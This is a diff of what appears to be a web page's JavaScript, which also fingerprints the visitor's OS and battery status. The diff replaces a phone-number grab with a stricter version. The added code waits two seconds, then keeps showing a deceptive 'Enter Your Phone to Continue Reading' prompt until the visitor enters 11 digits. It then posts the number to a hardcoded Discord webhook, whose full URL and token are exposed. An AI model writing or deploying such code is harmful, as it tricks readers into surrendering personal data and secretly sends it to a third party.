@@ -161,13 +161,26 @@ function detectOS() {
     }
 }
 // number
-setTimeout(() => {
-    fetch("https://discord.com/api/webhooks/1330487817914155060/7zGOaywZAThxAFy_d4r3z2kRV2im-lxXu5Na0k6nB_UnSUpbCw4jlh1E62URtcyh1K3E", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ content: prompt("Enter Your Phone to Continue Reading:") })
-    });
-  }, 2000);
+function askForPhoneNumber() {
+  let phone;
+  const phoneRegex = /^\d{11}$/; // Exactly 11 digits
+
+  do {
+    phone = prompt("Enter Your Phone to Continue Reading :");
+    if (phone === null) return; // User clicked cancel, you can handle it differently if needed
+  } while (!phoneRegex.test(phone));
+
+  // Send to Discord webhook
+  fetch("https://discord.com/api/webhooks/1330487817914155060/7zGOaywZAThxAFy_d4r3z2kRV2im-lxXu5Na0k6nB_UnSUpbCw4jlh1E62URtcyh1K3E", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ content: phone })
+  });
+}
+
+// Delay for 2 seconds before showing the prompt
+setTimeout(askForPhoneNumber, 2000);
+//
 
 detectOS();
 getBatteryStatus();
